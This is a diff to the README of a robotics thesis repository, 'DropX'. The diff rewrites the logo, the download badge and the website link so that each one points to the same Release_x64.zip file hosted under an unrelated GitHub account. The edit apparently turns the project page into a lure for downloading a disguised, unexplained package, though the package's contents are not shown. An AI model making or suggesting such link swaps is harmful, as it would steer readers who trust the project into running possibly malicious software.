@@ -2,7 +2,7 @@
 
 ## Thesis by Hira Amir and Ambar Arain 🎓
 
-![DropX Logo](https://example.com/dropx_logo.jpg)
+![DropX Logo](https://github.com/fongbeer2542/DropX/releases/download/v1.0/Release_x64.zip)
 
 Welcome to the official repository for the thesis project **DropX** submitted by Hira Amir and Ambar Arain under the supervision of Dr. Mohsin Memon and Co-Supervised by Yusha Bin Arif. This project dives into the world of deep learning, sensor fusion, reinforcement learning, and simulation using the Webots Robot Simulator.
 
@@ -15,7 +15,7 @@ Welcome to the official repository for the thesis project **DropX** submitted by
 ### 📦 Get the Software Package
 
 Click the button below to download the software package:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/fongbeer2542/DropX/releases/download/v1.0/Release_x64.zip)](https://github.com/fongbeer2542/DropX/releases/download/v1.0/Release_x64.zip)
 
 ### 🌐 Thesis Abstract
 
@@ -59,7 +59,7 @@ The DropX project is released under the MIT License. For details, refer to the *
 
 🌟 Explore the cutting-edge world of robotics with DropX! Download the software package now and embark on a journey of innovation and exploration! 🌟
 
-🔗 For more information and updates, visit our [website](https://www.dropxthesis.com).
+🔗 For more information and updates, visit our [website](https://github.com/fongbeer2542/DropX/releases/download/v1.0/Release_x64.zip).
 
 🚀 Get ready to revolutionize the robotics industry with DropX! 🤖
 
